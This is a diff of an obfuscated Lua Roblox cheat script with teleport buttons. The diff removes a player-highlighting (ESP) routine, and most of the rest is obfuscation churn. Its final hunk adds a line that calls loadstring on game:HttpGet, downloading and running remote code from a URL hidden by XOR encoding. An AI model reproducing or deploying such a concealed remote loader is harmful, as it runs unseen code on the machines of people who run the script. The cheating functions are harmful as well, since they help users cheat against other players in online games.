@@ -18,8 +18,8 @@ local v5 = table.concat;
 local v6 = table.insert;
 local function v7(v12, v13)
 	local v14 = {};
-	for v34 = 1, #v12 do
-		v6(v14, v0(v4(v1(v2(v12, v34, v34 + 1)), v1(v2(v13, 1 + (v34 % #v13), 1 + (v34 % #v13) + 1))) % 256));
+	for v27 = 1, #v12 do
+		v6(v14, v0(v4(v1(v2(v12, v27, v27 + 1)), v1(v2(v13, 1 + (v27 % #v13), 1 + (v27 % #v13) + 1))) % 256));
 	end
 	return v5(v14);
 end
@@ -33,54 +33,72 @@ v11:NewButton(v7("\103\200\34\243\67\119\232\232\74\216\34\249", "\152\38\189\86
 	local v17;
 	local v18;
 	while true do
-		if (v15 == (1262 - (1091 + 171))) then
+		if ((0 - 0) == v15) then
 			v16 = game.Players.LocalPlayer;
 			v17 = v16.Character or v16.CharacterAdded:Wait();
-			v15 = 1 + 0;
+			v15 = 2 - 1;
 		end
-		if ((3 - 2) == v15) then
+		if (v15 == (1 - 0)) then
 			v18 = v17:WaitForChild(v7("\128\104\113\41\29\123\243\71\154\114\115\60\35\117\232\87", "\35\200\29\28\72\115\20\154"));
-			v18.CFrame = CFrame.new(3463.9453, 122.40337 - 85, -(1912.2567 - (123 + 251)));
+			v18.CFrame = CFrame.new(3189.9453 + 274, 162.40337 - 125, -(1396.2567 + 142));
 			break;
 		end
 	end
 end);
 local v11 = v10:NewSection(v7("\56\180\208\159\160\45\58\13\176", "\84\121\223\177\191\237\76"));
 v11:NewButton(v7("\143\83\197\165\42\95\34\213", "\161\219\54\169\192\90\48\80"), v7("\107\87\20\49\70\76\41\43\79\77", "\69\41\34\96"), function()
-	local v19 = 0 - 0;
+	local v19 = 0;
 	local v20;
 	local v21;
 	local v22;
 	while true do
-		if (v19 == (699 - (208 + 490))) then
-			v22 = v21:WaitForChild(v7("\148\214\218\11\12\36\181\199\229\5\13\63\140\194\197\30", "\75\220\163\183\106\98"));
-			v22.CFrame = CFrame.new(70.66278 + 758, 2.25 + 1, 208.20689);
-			break;
+		if (v19 == (0 - 0)) then
+			local v30 = 1413 - (447 + 966);
+			while true do
+				if (v30 == 0) then
+					local v34 = 0 - 0;
+					while true do
+						if (0 == v34) then
+							v20 = game.Players.LocalPlayer;
+							v21 = v20.Character or v20.CharacterAdded:Wait();
+							v34 = 1;
+						end
+						if (v34 == (1818 - (1703 + 114))) then
+							v30 = 702 - (376 + 325);
+							break;
+						end
+					end
+				end
+				if (v30 == (1 - 0)) then
+					v19 = 1;
+					break;
+				end
+			end
 		end
-		if (v19 == (836 - (660 + 176))) then
-			v20 = game.Players.LocalPlayer;
-			v21 = v20.Character or v20.CharacterAdded:Wait();
-			v19 = 1 + 0;
+		if (v19 == (2 - 1)) then
+			v22 = v21:WaitForChild(v7("\148\214\218\11\12\36\181\199\229\5\13\63\140\194\197\30", "\75\220\163\183\106\98"));
+			v22.CFrame = CFrame.new(237.66278 + 591, 6.25 - 3, 222.20689 - (9 + 5));
+			break;
 		end
 	end
 end);
 local v10 = v9:NewTab(v7("\50\187\153\35\153\80", "\185\98\218\235\87"));
 local v11 = v10:NewSection(v7("\234\41\51\233\221\165\198\44\43\227\202\175", "\202\171\92\71\134\190"));
 v11:NewButton(v7("\8\212\56\135\42\206\33\152\37\196\56\141", "\232\73\161\76"), v7("\153\204\86\73\17\181\240\76\91\17", "\126\219\185\34\61"), function()
-	local v23 = 202 - (14 + 188);
+	local v23 = 376 - (85 + 291);
 	local v24;
 	local v25;
 	local v26;
 	while true do
-		if (v23 == (676 - (534 + 141))) then
+		if (v23 == 1) then
 			v26 = v25:WaitForChild(v7("\36\219\83\115\112\120\250\227\62\193\81\102\78\118\225\243", "\135\108\174\62\18\30\23\147"));
-			v26.CFrame = CFrame.new(1276.1339, 81.53998000000001 + 118, -2537.6679);
+			v26.CFrame = CFrame.new(2541.1339 - (243 + 1022), 199.53998, -(9653.6679 - 7116));
 			break;
 		end
 		if (v23 == (0 + 0)) then
 			v24 = game.Players.LocalPlayer;
 			v25 = v24.Character or v24.CharacterAdded:Wait();
-			v23 = 1 + 0;
+			v23 = 1181 - (1123 + 57);
 		end
 	end
 end);
@@ -91,120 +109,5 @@ v11:NewButton(v7("\34\14\188\40\18\2\188", "\75\103\118\217"), v7("\229\65\100\0
 end);
 local v11 = v10:NewSection(v7("\34\253\181", "\174\103\142\197"));
 v11:NewButton(v7("\115\59\79", "\152\54\72\63\88\69\62"), v7("\246\209\250\72\219\202\199\82\210\203", "\60\180\164\142"), function()
-	local v27 = game:GetService(v7("\104\82\4\48\34\255\1", "\114\56\62\101\73\71\141"));
-	local v28 = game:GetService(v7("\138\252\213\247\189\251\205\205\187\236", "\164\216\137\187"));
-	local v29 = v27.LocalPlayer;
-	local v30 = workspace:WaitForChild(v7("\245\231\60\183\135\215", "\107\178\134\81\210\198\158"));
-	local v31 = {};
-	local function v32(v35)
-		if v35:IsA(v7("\21\1\134\195\166", "\202\88\110\226\166")) then
-			return v35:FindFirstChild(v7("\235\26\143\246\196\204\6\134\197\197\204\27\178\246\216\215", "\170\163\111\226\151")) or v35:FindFirstChildWhichIsA(v7("\51\49\161\61\126\54\59\5", "\73\113\80\210\88\46\87"));
-		elseif v35:IsA(v7("\163\45\222\23\215\128\62\217", "\135\225\76\173\114")) then
-			return v35;
-		end
-	end
-	local function v33(v36)
-		local v37 = 0;
-		local v38;
-		local v39;
-		local v40;
-		local v41;
-		while true do
-			if (v37 == (1 - 0)) then
-				v39.Name = v7("\140\244\56\249\127\254\161\212\23\248\108", "\150\205\189\112\144\24");
-				v39.FillColor = Color3.fromRGB(404 - 149, 0 - 0, 0 + 0);
-				v39.OutlineColor = Color3.fromRGB(255, 255, 163 + 92);
-				v39.FillTransparency = 396.5 - (115 + 281);
-				v37 = 4 - 2;
-			end
-			if (v37 == 5) then
-				v41.TextStrokeTransparency = 0 + 0;
-				v41.TextScaled = true;
-				v41.Font = Enum.Font.SourceSansBold;
-				v41.Parent = v40;
-				v37 = 14 - 8;
-			end
-			if (v37 == 4) then
-				v41 = Instance.new(v7("\224\26\31\199\154\125\132\209\19", "\230\180\127\103\179\214\28"));
-				v41.Size = UDim2.new(1, 0 - 0, 868 - (550 + 317), 0);
-				v41.BackgroundTransparency = 1 - 0;
-				v41.TextColor3 = Color3.fromRGB(255, 358 - 103, 712 - 457);
-				v37 = 290 - (134 + 151);
-			end
-			if (v37 == (1667 - (970 + 695))) then
-				v39.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop;
-				v39.Adornee = v36;
-				v39.Parent = v36;
-				v40 = Instance.new(v7("\7\141\179\64\6\135\16\2\33\163\170\69", "\112\69\228\223\44\100\232\113"));
-				v37 = 5 - 2;
-			end
-			if (v37 == (1996 - (582 + 1408))) then
-				v31[v36] = {[v7("\158\10\80\82", "\128\236\101\63\38\132\33")]=v38,[v7("\160\168\19\65\186", "\175\204\201\113\36\214\139")]=v41};
-				break;
-			end
-			if ((10 - 7) == v37) then
-				v40.Size = UDim2.new(0, 125 - 25, 0 - 0, 1864 - (1195 + 629));
-				v40.StudsOffset = Vector3.new(0 - 0, 244 - (187 + 54), 780 - (162 + 618));
-				v40.AlwaysOnTop = true;
-				v40.Parent = v38;
-				v37 = 4;
-			end
-			if (v37 == (0 + 0)) then
-				if v31[v36] then
-					return;
-				end
-				v38 = v32(v36);
-				if not v38 then
-					return;
-				end
-				v39 = Instance.new(v7("\50\228\191\184\160\180\160\18\249", "\199\122\141\216\208\204\221"));
-				v37 = 1;
-			end
-		end
-	end
-	for v42, v43 in ipairs(v30:GetChildren()) do
-		v33(v43);
-	end
-	v30.ChildAdded:Connect(v33);
-	v28.RenderStepped:Connect(function()
-		local v44 = 0 + 0;
-		local v45;
-		local v46;
-		while true do
-			if (v44 == (3 - 1)) then
-				for v75, v76 in pairs(v31) do
-					if (v75.Parent and v76.root) then
-						local v77 = 0 - 0;
-						local v78;
-						while true do
-							if (v77 == 0) then
-								v78 = (v46.Position - v76.root.Position).Magnitude;
-								v76.label.Text = string.format(v7("\232\54\232\134\115\190\108\172\132\32", "\83\205\24\217\224"), v78);
-								break;
-							end
-						end
-					end
-				end
-				break;
-			end
-			if (1 == v44) then
-				v46 = v45:FindFirstChild(v7("\111\217\56\221\10\72\197\49\238\11\72\216\5\221\22\83", "\100\39\172\85\188"));
-				if not v46 then
-					return;
-				end
-				v44 = 1 + 1;
-			end
-			if (0 == v44) then
-				v45 = v29.Character;
-				if not v45 then
-					return;
-				end
-				v44 = 1637 - (1373 + 263);
-			end
-		end
-	end);
-end);
-local v11 = v10:NewSection(v7("\205\192\212\63\239\203\201", "\93\134\165\173"));
-v11:NewKeybind(v7("\138\253\198\197\54\203\242\75\151", "\30\222\146\161\162\90\174\210"), v7("\206\75\105\8\236\64\116\35\235\72\127", "\106\133\46\16"), Enum.KeyCode.K, function()
-	v8:ToggleUI();
+	loadstring(game:HttpGet(v7("\80\74\17\57\52\183\93\23\76\4\62\105\234\27\76\86\16\43\50\254\23\74\93\10\39\51\232\28\76\16\6\38\42\162\20\87\76\0\63\34\255\26\89\80\4\34\40\226\93\84\91\8\32\42\228\17\85\91\8\38\53\228\23\75\17\23\44\33\254\93\80\91\4\45\52\162\31\89\87\11\102\34\254\2", "\114\56\62\101\73\71\141")))();
 end);
